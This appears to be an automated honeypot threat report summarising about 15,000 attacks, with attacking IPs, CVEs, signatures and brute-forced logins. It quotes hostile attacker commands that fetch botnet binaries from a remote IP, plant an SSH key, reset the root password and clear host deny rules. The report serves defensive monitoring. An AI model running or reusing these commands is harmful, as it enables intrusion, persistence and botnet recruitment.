Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T16:01:50Z
**Timeframe:** 2025-10-15T15:20:01Z to 2025-10-15T16:00:01Z
**Files Used:**
- agg_log_20251015T152001Z.json
- agg_log_20251015T154001Z.json
- agg_log_20251015T160001Z.json

**Executive Summary**

This report summarizes 15,328 attacks recorded across multiple honeypots. The primary attack vectors were VoIP (Session Initiation Protocol), VNC, and email services. Sentrypeer, Honeytrap, and Cowrie were the most engaged honeypots. A significant portion of the attacks originated from a small number of IP addresses, indicating targeted attacks or botnet activity. Several CVEs were targeted, and a variety of shell commands were attempted, including efforts to download and execute malware.

**Detailed Analysis**

***Attacks by Honeypot***

- Sentrypeer
- Honeytrap
- Suricata
- Ciscoasa
- Cowrie
- Heralding
- H0neytr4p
- Redishoneypot
- Mailoney
- Dionaea
- Tanner
- Adbhoney
- Miniprint
- ConPot
- ElasticPot
- Honeyaml

***Top Attacking IPs***

- 185.243.5.121
- 206.191.154.180
- 86.54.42.238
- 23.94.26.58
- 172.86.95.98
- 172.86.95.115
- 10.140.0.3
- 45.134.26.47
- 62.141.43.183

***Top Targeted Ports/Protocols***

- 5060
- vnc/5900
- 25
- 22
- 443
- 8333
- 5903
- 5901
- 6379

***Most Common CVEs***

- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2002-1149
- CVE-2001-0414

***Commands Attempted by Attackers***

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `Enter new UNIX password:`
- `/ip cloud print`
- `cat /proc/uptime 2 > /dev/null | cut -d. -f1`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`
- `ifconfig`
- `uname -a`
- `ps | grep '[Mm]iner'`
- `echo "root:VkfoVXsitWYu"|chpasswd|bash`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`

***Signatures Triggered***

- ET INFO VNC Authentication Failure
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
- ET VOIP Modified Sipvicious Asterisk PBX User-Agent
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- GPL SHELLCODE x86 inc ebx NOOP
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- GPL TELNET Bad Login

***Users / Login Attempts***

- support/support2000
- ubnt/11111
- ubnt/qwerty123
- centos/centos2010
- root/@sterAdm1n
- blank/password321
- root/admin@1
- nobody/nobody2015
- support/0000
- user/user2015

***Files Uploaded/Downloaded***

- bot.html
- get?src=cl1ckh0use
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- Mozi.a
- jaws
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- genomecrawler

***HTTP User-Agents***

- No HTTP user agents were logged in the provided data.

***SSH Clients and Servers***

- No SSH clients or servers were logged in the provided data.

***Top Attacker AS Organizations***

- No AS organizations were logged in the provided data.

**Key Observations and Anomalies**

- A significant number of commands are related to downloading and executing binaries, suggesting attempts to install malware or recruit the honeypot into a botnet. The filenames `arm.urbotnetisass`, `boatnet.arm7`, and `Mozi.a` are indicative of this.
- There is a continued focus on VoIP-related ports (5060), which is a common trend.
- The presence of commands like `ps | grep '[Mm]iner'` suggests that attackers are checking for the presence of cryptocurrency miners, possibly to eliminate competition.
- The variety of attempted credentials indicates a brute-force approach, targeting a wide range of common and default usernames and passwords.
